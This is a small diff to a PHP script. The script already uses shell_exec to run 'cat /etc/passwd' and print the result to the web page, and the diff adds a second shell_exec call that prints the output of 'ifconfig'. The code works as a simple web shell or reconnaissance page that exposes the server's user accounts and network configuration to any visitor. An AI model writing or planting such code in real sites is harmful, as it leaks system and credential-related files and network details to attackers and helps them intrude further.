@@ -9,4 +9,8 @@ $output = shell_exec('cat /etc/passwd');
 echo "<pre>$output</pre>";
 
 
+echo "<pre>###############</pre>";
+$output = shell_exec('ifconfig');
+echo "<pre>$output</pre>";
+
 ?>
